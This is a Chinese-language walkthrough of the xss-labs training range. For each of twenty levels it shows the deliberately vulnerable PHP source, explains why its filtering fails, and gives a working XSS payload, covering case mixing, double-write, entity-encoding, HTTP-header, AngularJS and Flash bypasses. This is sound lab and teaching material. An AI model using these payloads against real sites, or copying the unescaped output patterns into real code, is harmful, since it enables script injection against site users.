# 原创
：  xss-labs

# xss-labs

#### xss-labs题解

## level1

```
代码审计
&lt;?php 
ini_set("display_errors", 0);
$str = $_GET["name"];
echo "&lt;h2 align=center&gt;欢迎用户".$str."&lt;/h2&gt;";
?&gt;

原理：传入的参数未经过其他处理直接引用导致恶意代码执行引发的XSS漏洞。

Payload：name=&lt;script&gt;alert(1)&lt;/script&gt;

```

## level2

```
代码审计
&lt;?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
echo "&lt;h2 align=center&gt;没有找到和".htmlspecialchars($str)."相关的结果.&lt;/h2&gt;".'&lt;center&gt;
&lt;form action=level2.php method=GET&gt;
&lt;input name=keyword  value="'.$str.'"&gt;
&lt;input type=submit name=submit value="搜索"/&gt;
&lt;/form&gt;
&lt;/center&gt;';
?&gt;

原理：在属性值处发生了转义

Payload：keyword="&gt;&lt;script&gt;alert(1)&lt;/script&gt;//

```

## level3

```
代码审计
&lt;?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
echo "&lt;h2 align=center&gt;没有找到和".htmlspecialchars($str)."相关的结果.&lt;/h2&gt;"."&lt;center&gt;
&lt;form action=level3.php method=GET&gt;
&lt;input name=keyword  value='".htmlspecialchars($str)."'&gt;
&lt;input type=submit name=submit value=搜索 /&gt;
&lt;/form&gt;
&lt;/center&gt;";
?&gt;

原理：两处都对特殊符号进行了转义，利用标签属性为恶意代码产生自己的事件，并且使用javascript:执行恶意代码；在javascript:后的代码将被解析成js代码执行

Payload：keyword='onfocus=javascript:alert(1)&gt;//

```

## level4

```
代码审计
&lt;?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str2=str_replace("&gt;","",$str);
$str3=str_replace("&lt;","",$str2);
echo "&lt;h2 align=center&gt;没有找到和".htmlspecialchars($str)."相关的结果.&lt;/h2&gt;".'&lt;center&gt;
&lt;form action=level4.php method=GET&gt;
&lt;input name=keyword  value="'.$str3.'"&gt;
&lt;input type=submit name=submit value=搜索 /&gt;
&lt;/form&gt;
&lt;/center&gt;';
?&gt;

原理：对特殊字符直接进行替代，但是不够全面，还可以产生恶意代码自身的事件

Payload：keyword="onfocus=javascript:alert(1)&gt;//

```

## level5

```
代码审计：
&lt;?php 
ini_set("display_errors", 0);
$str = strtolower($_GET["keyword"]);
$str2=str_replace("&lt;script","&lt;scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
echo "&lt;h2 align=center&gt;没有找到和".htmlspecialchars($str)."相关的结果.&lt;/h2&gt;".'&lt;center&gt;
&lt;form action=level5.php method=GET&gt;
&lt;input name=keyword  value="'.$str3.'"&gt;
&lt;input type=submit name=submit value=搜索 /&gt;
&lt;/form&gt;
&lt;/center&gt;';
?&gt;

原理：使用了转义特殊字符函数与匹配替代函数，但是搜索框并没有对标签括号进行替代，也就是说我们可以为其添加自己的标签

Payload：keyword="&gt;&lt;a href=javascript:alert(1)&gt;haha&lt;/a&gt;

```

## level6

```
代码审计：
&lt;?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str2=str_replace("&lt;script","&lt;scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
$str4=str_replace("src","sr_c",$str3);
$str5=str_replace("data","da_ta",$str4);
$str6=str_replace("href","hr_ef",$str5);
echo "&lt;h2 align=center&gt;没有找到和".htmlspecialchars($str)."相关的结果.&lt;/h2&gt;".'&lt;center&gt;
&lt;form action=level6.php method=GET&gt;
&lt;input name=keyword  value="'.$str6.'"&gt;
&lt;input type=submit name=submit value=搜索 /&gt;
&lt;/form&gt;
&lt;/center&gt;';
?&gt;

原理：更全面的敏感词过滤，但是没有大小写检测

Payload："&gt;&lt;a Href=javaScript:alert(1)&gt;haha&lt;/a&gt;

```

## level7

```
代码审计：
&lt;?php 
ini_set("display_errors", 0);
$str =strtolower( $_GET["keyword"]);
$str2=str_replace("script","",$str);
$str3=str_replace("on","",$str2);
$str4=str_replace("src","",$str3);
$str5=str_replace("data","",$str4);
$str6=str_replace("href","",$str5);
echo "&lt;h2 align=center&gt;没有找到和".htmlspecialchars($str)."相关的结果.&lt;/h2&gt;".'&lt;center&gt;
&lt;form action=level7.php method=GET&gt;
&lt;input name=keyword  value="'.$str6.'"&gt;
&lt;input type=submit name=submit value=搜索 /&gt;
&lt;/form&gt;
&lt;/center&gt;';
?&gt;

原理：采用了关键字匹配去除，可以使用双写绕过

Payload："&gt;&lt;scrscriptipt&gt;alert(1)&lt;/scrscriptipt&gt;//

```

## level8

```
代码审计：
&lt;?php 
ini_set("display_errors", 0);
$str = strtolower($_GET["keyword"]);
$str2=str_replace("script","scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
$str4=str_replace("src","sr_c",$str3);
$str5=str_replace("data","da_ta",$str4);
$str6=str_replace("href","hr_ef",$str5);
$str7=str_replace('"','&amp;quot',$str6);
echo '&lt;center&gt;
&lt;form action=level8.php method=GET&gt;
&lt;input name=keyword  value="'.htmlspecialchars($str).'"&gt;
&lt;input type=submit name=submit value=添加友情链接 /&gt;
&lt;/form&gt;
&lt;/center&gt;';
?&gt;
&lt;?php
 echo '&lt;center&gt;&lt;BR&gt;&lt;a href="'.$str7.'"&gt;友情链接&lt;/a&gt;&lt;/center&gt;';
?&gt;

原理：HTML中属性值本身是支持ASCII码的，所以我们可以对属性值进行Unicode编码之后进行传参

思路：敏感字符已经被加下划线过滤；新建标签不可能，双引号也被过滤，所以说也没有办法给属性值闭合；还有小写处理，所以不能大小写混写；没有敏感字符去除，所以不能双写绕过；所以说才考虑到字符编码转码，用Unicode进行编码并且正好插入属性值处，HTML解析之后直接执行

Payload：keyword=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;

```

## level9

```
代码审计：
&lt;?php 
ini_set("display_errors", 0);
$str = strtolower($_GET["keyword"]);
$str2=str_replace("script","scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
$str4=str_replace("src","sr_c",$str3);
$str5=str_replace("data","da_ta",$str4);
$str6=str_replace("href","hr_ef",$str5);
$str7=str_replace('"','&amp;quot',$str6);
echo '&lt;center&gt;
&lt;form action=level9.php method=GET&gt;
&lt;input name=keyword  value="'.htmlspecialchars($str).'"&gt;
&lt;input type=submit name=submit value=添加友情链接 /&gt;
&lt;/form&gt;
&lt;/center&gt;';
?&gt;
&lt;?php
if(false===strpos($str7,'http://'))
{
  echo '&lt;center&gt;&lt;BR&gt;&lt;a href="您的链接不合法？有没有！"&gt;友情链接&lt;/a&gt;&lt;/center&gt;';
        }
else
{
  echo '&lt;center&gt;&lt;BR&gt;&lt;a href="'.$str7.'"&gt;友情链接&lt;/a&gt;&lt;/center&gt;';
}
?&gt;

原理：白名单和盲注的感觉；题目要求插入友情链接中必须有网址的格式http://，匹配到之后才认定这是一个合法的网址；否则就会说你的链接不合法；但是仍旧没摆脱编码的魔爪

Payload：keyword=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41; //http://123.com

```

## level10

```
代码审计：
&lt;?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str11 = $_GET["t_sort"];
$str22=str_replace("&gt;","",$str11);
$str33=str_replace("&lt;","",$str22);
echo "&lt;h2 align=center&gt;没有找到和".htmlspecialchars($str)."相关的结果.&lt;/h2&gt;".'&lt;center&gt;
&lt;form id=search&gt;
&lt;input name="t_link"  value="'.'" type="hidden"&gt;
&lt;input name="t_history"  value="'.'" type="hidden"&gt;
&lt;input name="t_sort"  value="'.$str33.'" type="hidden"&gt;
&lt;/form&gt;
&lt;/center&gt;';
?&gt;

原理：页面隐藏了输入框，并且输入框可以被赋值，没有过滤；属性值注入

Payload：?keyword=1&amp;t_sort=1" οnclick="alert(1)" type=button &gt;//；点击建立的按钮过关

```

## level11

```
代码审计：
&lt;?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str00 = $_GET["t_sort"];
$str11=$_SERVER['HTTP_REFERER'];
$str22=str_replace("&gt;","",$str11);
$str33=str_replace("&lt;","",$str22);
echo "&lt;h2 align=center&gt;没有找到和".htmlspecialchars($str)."相关的结果.&lt;/h2&gt;".'&lt;center&gt;
&lt;form id=search&gt;
&lt;input name="t_link"  value="'.'" type="hidden"&gt;
&lt;input name="t_history"  value="'.'" type="hidden"&gt;
&lt;input name="t_sort"  value="'.htmlspecialchars($str00).'" type="hidden"&gt;
&lt;input name="t_ref"  value="'.$str33.'" type="hidden"&gt;
&lt;/form&gt;
&lt;/center&gt;';
?&gt;

原理：http头部xss，对http头部属性信任，未进行过滤直接引用导致的xss漏洞

Payload：Referer:1" οnclick="javascript:alert(1)" type=button &gt;//；抓包改包

```

## level12

```
代码审计：
&lt;?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str00 = $_GET["t_sort"];
$str11=$_SERVER['HTTP_USER_AGENT'];
$str22=str_replace("&gt;","",$str11);
$str33=str_replace("&lt;","",$str22);
echo "&lt;h2 align=center&gt;没有找到和".htmlspecialchars($str)."相关的结果.&lt;/h2&gt;".'&lt;center&gt;
&lt;form id=search&gt;
&lt;input name="t_link"  value="'.'" type="hidden"&gt;
&lt;input name="t_history"  value="'.'" type="hidden"&gt;
&lt;input name="t_sort"  value="'.htmlspecialchars($str00).'" type="hidden"&gt;
&lt;input name="t_ua"  value="'.$str33.'" type="hidden"&gt;
&lt;/form&gt;
&lt;/center&gt;';
?&gt;


原理：仍旧是发生在HTTP头部的XSS注入，这次的位置点是useragent属性，原因是对http头部参数过于信任，过滤不全导致的XSS

Payload：User-Agent:1" οnclick="javascript:alert(1)" type=button &gt; //；抓包改包

```

## level13

```
代码审计：
&lt;?php 
setcookie("user", "call me maybe?", time()+3600);
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str00 = $_GET["t_sort"];
$str11=$_COOKIE["user"];
$str22=str_replace("&gt;","",$str11);
$str33=str_replace("&lt;","",$str22);
echo "&lt;h2 align=center&gt;没有找到和".htmlspecialchars($str)."相关的结果.&lt;/h2&gt;".'&lt;center&gt;
&lt;form id=search&gt;
&lt;input name="t_link"  value="'.'" type="hidden"&gt;
&lt;input name="t_history"  value="'.'" type="hidden"&gt;
&lt;input name="t_sort"  value="'.htmlspecialchars($str00).'" type="hidden"&gt;
&lt;input name="t_cook"  value="'.$str33.'" type="hidden"&gt;
&lt;/form&gt;
&lt;/center&gt;';
?&gt;

原理：HTTP头部cookie注入

Payload：Cookie:user=click me!" type="button" οnclick="alert(1)" or user=" type='text' onclick='alert(1)'

```

## level14

```
代码审计：
无代码，该题为跳转页面至其他地方做题

原理：利用图片XSS

Payload：参考链接：https://xz.aliyun.com/t/1206?accounttraceid=74ab404d-2a01-4a1c-8b87-36ad367dbe11#toc-12

```

## level15

```
代码审计：
&lt;?php 
ini_set("display_errors", 0);
$str = $_GET["src"];
echo '&lt;body&gt;&lt;span class="ng-include:'.htmlspecialchars($str).'"&gt;&lt;/span&gt;&lt;/body&gt;';
?&gt;

原理：这里用了angularjs的ng-include，直接在包含的页面里用&amp;lt;script&amp;gt;触发不了，用了img标签；遵循SOP，只好调用第一关代码；需要单引号包裹，否则变成注释

Payload：src='level1.php?name=test&lt;img src=1 οnerrοr=alert(1)&gt;'

补充：AngularJS ng-include 指令
ng-include 指令用于包含外部的 HTML 文件；包含的内容将作为指定元素的子节点；ng-include 属性的值可以是一个表达式，返回一个文件名；默认情况下，包含的文件需要包含在同一个域名下

```

## level16

```
代码审计：
&lt;?php 
ini_set("display_errors", 0);
$str = strtolower($_GET["keyword"]);
$str2=str_replace("script","&amp;nbsp;",$str);
$str3=str_replace(" ","&amp;nbsp;",$str2);
$str4=str_replace("/","&amp;nbsp;",$str3);
$str5=str_replace("	","&amp;nbsp;",$str4);
echo "&lt;center&gt;".$str5."&lt;/center&gt;";
?&gt;

原理：这关主要考察的是空格的替代符，回车TAB以及换行符；在JS代码执行过程中，如果运行过程中如果语句不完整并且没有匹配到分号结束符，那么就会继续向下执行知道形成一个完整的语句才会停止，所以即使没有分号分隔用换行也能断句，还能防止空格被替代引发的尴尬境地

Payload：&lt;img%0asrc=1%0donerror=alert(1)&gt;

补充：回车(CR,%0d,ASCII 13,\r)换行(LF,%0a,ASCII 10,\n)

```

## level17

```
代码审计：
&lt;?php
ini_set("display_errors", 0);
echo "&lt;embed src=xsf01.swf?".htmlspecialchars($_GET["arg01"])."=".htmlspecialchars($_GET["arg02"])." width=100% heigth=100%&gt;";
?&gt;

原理：Flash XSS

Payload：?arg01=a&amp;arg02=b onmouseout=alert(1)

补充：swf文件，即shockwave flash文件，能被flash player打开

```

## level18

```
代码审计：
&lt;?php
ini_set("display_errors", 0);
echo "&lt;embed src=xsf02.swf?".htmlspecialchars($_GET["arg01"])."=".htmlspecialchars($_GET["arg02"])." width=100% heigth=100%&gt;";
?&gt;

原理：src多了双引号包括，加个双引号直接过关

Payload：?arg01=a&amp;arg02=b" onmouseout=alert(1)//

```

## level19

```
代码审计：
&lt;?php
ini_set("display_errors", 0);
echo '&lt;embed src="xsf03.swf?'.htmlspecialchars($_GET["arg01"])."=".htmlspecialchars($_GET["arg02"]).'" width=100% heigth=100%&gt;';
?&gt;

原理：get了两个参数，并且拼接到src里面；类似于php传参处理，swf文件也能传入参数

Payload：?arg01=version&amp;arg02=&lt;a href="javascript:alert(123)"&gt;click here&lt;/a&gt;

```

## level20

```
代码审计：
&lt;?php
ini_set("display_errors", 0);
echo '&lt;embed src="xsf04.swf?'.htmlspecialchars($_GET["arg01"])."=".htmlspecialchars($_GET["arg02"]).'" width=100% heigth=100%&gt;';
?&gt;

原理：zeroclipboard xss

Payload：?arg01=id&amp;arg02=xss"))}catch(e){alert(/xss/)}//%26width=123%26height=123

具体思路参考链接：https://blog.csdn.net/u014029795/article/details/103217680

补充：ZeroClipboard 是一个用于剪贴板复制的 JS 插件，它是基于 Flash 来实现跨浏览器的复制功能

```
